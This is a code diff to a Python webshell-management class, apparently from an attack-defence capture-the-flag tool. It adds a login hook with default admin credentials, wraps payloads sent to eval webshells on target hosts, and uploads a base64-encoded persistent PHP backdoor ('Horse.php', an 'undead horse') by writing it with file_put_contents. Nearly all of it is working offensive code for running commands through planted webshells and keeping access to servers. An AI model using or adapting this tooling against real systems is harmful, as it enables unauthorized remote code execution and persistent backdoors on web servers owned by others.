@@ -21,7 +21,14 @@ class ShellRequest:
         self.session = requests.session()
 
     def pre_operate(self, target):
+        """操作shell之前的操作，可用于登录"""
         # ip, port = target['ip'], target['port']
+        # data = {'username':'admin','password':'password'}
+        # url = 'http://{}:{}/login.php'.format(ip, port)
+        # try:
+        #     self.session.post(url, data=data, headers=self.headers, proxies=Config.proxy, timeout=2)
+        # except requests.Timeout:
+        #     pass
         pass
 
     @staticmethod
@@ -42,6 +49,8 @@ class ShellRequest:
         shell_path = shell['path']
         ip, port = target['ip'], target['port']
         result, response = None, None
+
+        self.pre_operate(target)
 
         if shell_type == 'eval':
             payload = "printf('*----START----*');" + payload + ";printf('*----END----*');"
@@ -82,6 +91,7 @@ class ShellRequest:
         ip, port = target['ip'], target['port']
         result, response = None, None
 
+        self.pre_operate(target)
         if shell_method == 'GET':
             url_ = "http://{}:{}/{}?{}={}" if '?' not in shell_path else "http://{}:{}/{}&{}={}"
             url = url_.format(ip, port, shell_path, shell_password, filepath)
@@ -111,7 +121,8 @@ class ShellRequest:
         horse_content = open("horse/"+horse_name+'/Horse.php', 'rb').read()
         horse_content = horse_content.replace(b'.config_cdut.php', Config.undead_horse_name.encode())
         horse_b64content = base64.b64encode(horse_content).decode()
-
+        
+        self.pre_operate(target)
         if shell_method == "GET":
             payload = "var_dump(file_put_contents('Horse.php', base64_decode(file_get_contents('php://input'))));"
         else:
